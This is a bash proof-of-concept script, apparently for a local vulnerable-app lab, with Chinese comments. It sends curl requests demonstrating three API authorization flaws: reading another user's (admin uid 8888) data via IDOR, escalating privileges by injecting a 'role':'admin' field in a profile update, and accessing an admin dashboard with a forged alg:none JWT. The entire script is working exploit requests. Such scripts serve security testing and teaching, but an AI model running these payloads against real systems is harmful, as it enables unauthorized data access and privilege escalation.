#!/bin/bash

BASE_URL="http://127.0.0.1:80/vul/overpermission/api"

echo -e "\n=============================================="
echo "    [1] BOLA (API IDOR) 漏洞验证"
echo "=============================================="
echo ">> 正常请求获取 UID=1001 的数据:"
curl -s "${BASE_URL}/user_info.php?uid=1001" | jq . || curl -s "${BASE_URL}/user_info.php?uid=1001"
echo -e "\n\n>> 越权请求获取 UID=8888 (admin) 的数据 (未验证Session属主):"
curl -s "${BASE_URL}/user_info.php?uid=8888" | jq . || curl -s "${BASE_URL}/user_info.php?uid=8888"

echo -e "\n\n=============================================="
echo "    [2] Mass Assignment (批量赋值) 漏洞验证"
echo "=============================================="
echo ">> 正常修改资料提交 (无恶意字段):"
curl -s -X PUT "${BASE_URL}/update_profile.php" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com", "phone":"123"}' | jq . || curl -s -X PUT "${BASE_URL}/update_profile.php" -H "Content-Type: application/json" -d '{"email":"test@test.com", "phone":"123"}'

echo -e "\n\n>> 恶意提交 (注入 \"role\":\"admin\"):"
curl -s -X PUT "${BASE_URL}/update_profile.php" \
    -H "Content-Type: application/json" \
    -d '{"email":"hacker@test.com", "phone":"999", "role":"admin"}' | jq . || curl -s -X PUT "${BASE_URL}/update_profile.php" -H "Content-Type: application/json" -d '{"email":"hacker@test.com", "phone":"999", "role":"admin"}'

echo -e "\n\n=============================================="
echo "    [3] JWT Forgery (身份伪造) 漏洞验证"
echo "=============================================="
echo ">> 正常普通用户 JWT 访问 Admin API:"
# uid:1001, role:user
NORMAL_JWT="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwMDEsInVzZXJuYW1lIjoibHVjeSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE4OTYxMDAwLCJleHAiOjE3MTg5NjQ2MDB9.VnZ1oGv-g4P-tIeU_hKj8iHjO3Gz4k3iZ9sS_Y3w_c0"
curl -s -X POST "${BASE_URL}/admin_dashboard.php" \
    -H "Authorization: Bearer ${NORMAL_JWT}" | jq . || curl -s -X POST "${BASE_URL}/admin_dashboard.php" -H "Authorization: Bearer ${NORMAL_JWT}"

echo -e "\n\n>> 伪造 JWT (alg:none, role:admin) 访问 Admin API:"
FORGED_JWT="eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1aWQiOjEwMDEsInVzZXJuYW1lIjoibHVjeSIsInJvbGUiOiJhZG1pbiJ9."
curl -s -X POST "${BASE_URL}/admin_dashboard.php" \
    -H "Authorization: Bearer ${FORGED_JWT}" | jq . || curl -s -X POST "${BASE_URL}/admin_dashboard.php" -H "Authorization: Bearer ${FORGED_JWT}"
echo -e "\n"
